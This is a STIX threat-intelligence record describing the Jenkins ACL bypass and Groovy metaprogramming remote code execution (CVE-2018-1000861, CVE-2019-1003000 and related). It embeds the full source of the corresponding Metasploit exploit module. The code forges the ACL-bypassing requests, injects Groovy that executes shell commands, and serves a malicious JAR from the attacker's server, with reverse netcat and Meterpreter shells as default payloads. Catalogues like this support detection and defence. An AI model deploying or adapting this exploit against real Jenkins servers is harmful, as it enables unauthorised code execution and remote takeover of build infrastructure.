{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3949d398-7306-4823-bb33-3e3978255f7b",
    "created": "2024-08-14T17:07:52.20618Z",
    "modified": "2024-08-14T17:07:52.206184Z",
    "name": "Jenkins ACL Bypass and Metaprogramming RCE",
    "description": " This module exploits a vulnerability in Jenkins dynamic routing to bypass the Overall/Read ACL and leverage Groovy metaprogramming to download and execute a malicious JAR file.  When the \"Java Dropper\" target is selected, the original entry point based on classLoader.parseClass is used, which requires the use of Groovy metaprogramming to achieve RCE.  When the \"Unix In-Memory\" target is selected, a newer, higher-level and more universal entry point based on GroovyShell.parse is used. This permits the use of in-memory arbitrary command execution.  The ACL bypass gadget is specific to Jenkins <= 2.137 and will not work on later versions of Jenkins.  Tested against Jenkins 2.137 and Pipeline: Groovy Plugin 2.61. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/jenkins_metaprogramming.rb",
            "external_id": "jenkins_metaprogramming.rb"
        },
        {
            "source_name": "reference",
            "url": "https://jenkins.io/security/advisory/2019-01-08/"
        },
        {
            "source_name": "reference",
            "url": "https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html"
        },
        {
            "source_name": "reference",
            "url": "https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/orange_8361/status/1126829648552312832"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/orangetw/awesome-jenkins-rce-2019"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'               => 'Jenkins ACL Bypass and Metaprogramming RCE',\n      'Description'        => %q{\n        This module exploits a vulnerability in Jenkins dynamic routing to\n        bypass the Overall/Read ACL and leverage Groovy metaprogramming to\n        download and execute a malicious JAR file.\n\n        When the \"Java Dropper\" target is selected, the original entry point\n        based on classLoader.parseClass is used, which requires the use of\n        Groovy metaprogramming to achieve RCE.\n\n        When the \"Unix In-Memory\" target is selected, a newer, higher-level,\n        and more universal entry point based on GroovyShell.parse is used.\n        This permits the use of in-memory arbitrary command execution.\n\n        The ACL bypass gadget is specific to Jenkins <= 2.137 and will not work\n        on later versions of Jenkins.\n\n        Tested against Jenkins 2.137 and Pipeline: Groovy Plugin 2.61.\n      },\n      'Author'             => [\n        'Orange Tsai',      # (@orange_8361) Discovery and PoC\n        'Mikhail Egorov',   # (@0ang3el)     Discovery and PoC\n        'George Noseevich', # (@webpentest)  Discovery and PoC\n        'wvu'               # Metasploit module\n      ],\n      'References'         => [\n        ['CVE', '2018-1000861'], # Orange Tsai\n        ['CVE', '2019-1003000'], # Script Security\n        ['CVE', '2019-1003001'], # Pipeline: Groovy\n        ['CVE', '2019-1003002'], # Pipeline: Declarative\n        ['CVE', '2019-1003005'], # Mikhail Egorov\n        ['CVE', '2019-1003029'], # George Noseevich\n        ['EDB', '46427'],\n        ['URL', 'https://jenkins.io/security/advisory/2019-01-08/'],\n        ['URL', 'https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html'],\n        ['URL', 'https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html'],\n        ['URL', 'https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc'],\n        ['URL', 'https://twitter.com/orange_8361/status/1126829648552312832'],\n        ['URL', 'https://github.com/orangetw/awesome-jenkins-rce-2019']\n      ],\n      'DisclosureDate'     => '2019-01-08', # Public disclosure\n      'License'            => MSF_LICENSE,\n      'Platform'           => ['unix', 'java'],\n      'Arch'               => [ARCH_CMD, ARCH_JAVA],\n      'Privileged'         => false,\n      'Targets'            => [\n        ['Unix In-Memory',\n          'Platform'       => 'unix',\n          'Arch'           => ARCH_CMD,\n          'Version'        => Rex::Version.new('2.137'),\n          'Type'           => :unix_memory,\n          'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_netcat'}\n        ],\n        ['Java Dropper',\n          'Platform'       => 'java',\n          'Arch'           => ARCH_JAVA,\n          'Version'        => Rex::Version.new('2.137'),\n          'Type'           => :java_dropper,\n          'DefaultOptions' => {'PAYLOAD' => 'java/meterpreter/reverse_https'}\n        ]\n      ],\n      'DefaultTarget'      => 1,\n      'Notes'              => {\n        'Stability'        => [CRASH_SAFE],\n        'Reliability'      => [REPEATABLE_SESSION],\n        'SideEffects'      => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n      },\n      'Stance'             => Stance::Aggressive\n    ))\n\n    register_options([\n      Opt::RPORT(8080),\n      OptString.new('TARGETURI', [true, 'Base path to Jenkins', '/'])\n    ])\n    deregister_options('URIPATH')\n  end\n\n=begin\n  http://jenkins.local/securityRealm/user/admin/search/index?q=[keyword]\n=end\n  def check\n    checkcode = CheckCode::Safe\n\n    res = send_request_cgi(\n      'method'   => 'GET',\n      'uri'      => go_go_gadget1('/search/index'),\n      'vars_get' => {'q' => 'a'}\n    )\n\n    unless res && (version = res.headers['X-Jenkins'])\n      vprint_error('Jenkins version not detected')\n      return CheckCode::Unknown\n    end\n\n    vprint_status(\"Jenkins #{version} detected\")\n    checkcode = CheckCode::Detected\n\n    if Rex::Version.new(version) > target['Version']\n      vprint_error(\"Jenkins #{version} is not a supported target\")\n      return CheckCode::Safe\n    end\n\n    vprint_good(\"Jenkins #{version} is a supported target\")\n    checkcode = CheckCode::Appears\n\n    if res.body.include?('Administrator')\n      vprint_good('ACL bypass successful')\n      checkcode = CheckCode::Vulnerable\n    else\n      vprint_error('ACL bypass unsuccessful')\n      return CheckCode::Safe\n    end\n\n    checkcode\n  end\n\n  def exploit\n    print_status(\"Configuring #{target.name} target\")\n\n    vars_get = {'value' => go_go_gadget2}\n\n    case target['Type']\n    when :unix_memory\n      vars_get = {'sandbox' => true}.merge(vars_get)\n    when :java_dropper\n      # NOTE: Ivy is using HTTP unconditionally, so we can't use HTTPS\n      # HACK: Both HttpClient and HttpServer use datastore['SSL']\n      ssl = datastore['SSL']\n      datastore['SSL'] = false\n      start_service('Path' => '/')\n      datastore['SSL'] = ssl\n    end\n\n    print_status('Sending Jenkins and Groovy go-go-gadgets')\n    send_request_cgi(\n      'method'   => 'GET',\n      'uri'      => go_go_gadget1,\n      'vars_get' => vars_get\n    )\n  end\n\n  #\n  # Exploit methods\n  #\n\n=begin\n  http://jenkins.local/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword\n  ?apiUrl=http://169.254.169.254/%23\n  &login=orange\n  &password=tsai\n=end\n  def go_go_gadget1(custom_uri = nil)\n    # NOTE: See CVE-2018-1000408 for why we don't want to randomize the username\n    acl_bypass = normalize_uri(target_uri.path, '/securityRealm/user/admin')\n\n    return normalize_uri(acl_bypass, custom_uri) if custom_uri\n\n    rce_base = normalize_uri(acl_bypass, 'descriptorByName')\n\n    rce_uri =\n      case target['Type']\n      when :unix_memory\n        '/org.jenkinsci.plugins.' \\\n          'scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript'\n      when :java_dropper\n        '/org.jenkinsci.plugins.' \\\n          'workflow.cps.CpsFlowDefinition/checkScriptCompile'\n      end\n\n    normalize_uri(rce_base, rce_uri)\n  end\n\n=begin\n  http://jenkins.local/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile\n  ?value=\n  @GrabConfig(disableChecksums=true)%0a\n  @GrabResolver(name='orange.tw', root='http://[your_host]/')%0a\n  @Grab(group='tw.orange', module='poc', version='1')%0a\n  import Orange;\n=end\n  def go_go_gadget2\n    case target['Type']\n    when :unix_memory\n      payload_escaped = payload.encoded.gsub(\"'\", \"\\\\'\")\n\n      <<~EOF.strip\n        class #{app} {\n          #{app}() {\n            ['sh', '-c', '#{payload_escaped}'].execute()\n          }\n        }\n      EOF\n    when :java_dropper\n      <<~EOF.strip\n        @GrabConfig(disableChecksums=true)\n        @GrabResolver('http://#{srvhost_addr}:#{srvport}')\n        @Grab('#{vendor}:#{app}:#{version}')\n        import #{app}\n      EOF\n    end\n  end\n\n  #\n  # Payload methods\n  #\n\n  #\n  # If you deviate from the following sequence, you will suffer!\n  #\n  # HEAD /path/to/pom.xml     -> 404\n  # HEAD /path/to/payload.jar -> 200\n  # GET  /path/to/payload.jar -> 200\n  #\n  def on_request_uri(cli, request)\n    vprint_status(\"#{request.method} #{request.uri} requested\")\n\n    unless %w[HEAD GET].include?(request.method)\n      vprint_error(\"Ignoring #{request.method} request\")\n      return\n    end\n\n    if request.method == 'HEAD'\n      if request.uri != payload_uri\n        vprint_error('Sending 404')\n        return send_not_found(cli)\n      end\n\n      vprint_good('Sending 200')\n      return send_response(cli, '')\n    end\n\n    if request.uri != payload_uri\n      vprint_error('Sending bogus file')\n      return send_response(cli, \"#{Faker::Hacker.say_something_smart}\\n\")\n    end\n\n    vprint_good('Sending payload JAR')\n    send_response(\n      cli,\n      payload_jar,\n      'Content-Type' => 'application/java-archive'\n    )\n\n    # XXX: $HOME may not work in some cases\n    register_dir_for_cleanup(\"$HOME/.groovy/grapes/#{vendor}\")\n  end\n\n  def payload_jar\n    jar = payload.encoded_jar\n\n    jar.add_file(\"#{app}.class\", constructor_class)\n    jar.add_file(\n      'META-INF/services/org.codehaus.groovy.plugins.Runners',\n      \"#{app}\\n\"\n    )\n\n    jar.pack\n  end\n\n=begin javac Metasploit.java\n  import metasploit.Payload;\n\n  public class Metasploit {\n      public Metasploit(){\n          try {\n              Payload.main(null);\n          } catch (Exception e) { }\n\n      }\n  }\n=end\n  def constructor_class\n    klass = Rex::Text.decode_base64(\n      <<~EOF\n        yv66vgAAADMAFQoABQAMCgANAA4HAA8HABAHABEBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAN\n        U3RhY2tNYXBUYWJsZQcAEAcADwwABgAHBwASDAATABQBABNqYXZhL2xhbmcvRXhjZXB0aW9u\n        AQAKTWV0YXNwbG9pdAEAEGphdmEvbGFuZy9PYmplY3QBABJtZXRhc3Bsb2l0L1BheWxvYWQB\n        AARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgAhAAQABQAAAAAAAQABAAYABwABAAgA\n        AAA3AAEAAgAAAA0qtwABAbgAAqcABEyxAAEABAAIAAsAAwABAAkAAAAQAAL/AAsAAQcACgAB\n        BwALAAAA\n      EOF\n    )\n\n    # Replace length-prefixed string \"Metasploit\" with a random one\n    klass.sub(\"\\x00\\x0aMetasploit\", \"#{[app.length].pack('n')}#{app}\")\n  end\n\n  #\n  # Utility methods\n  #\n\n  def payload_uri\n    \"/#{vendor}/#{app}/#{version}/#{app}-#{version}.jar\"\n  end\n\n  def vendor\n    @vendor ||= Faker::App.author.split(/[^[:alpha:]]/).join\n  end\n\n  def app\n    @app ||= Faker::App.name.split(/[^[:alpha:]]/).join\n  end\n\n  def version\n    @version ||= Faker::App.semantic_version\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2019-01-08, # Public disclosure",
    "x_mitre_platforms": [
        "java'"
    ]
}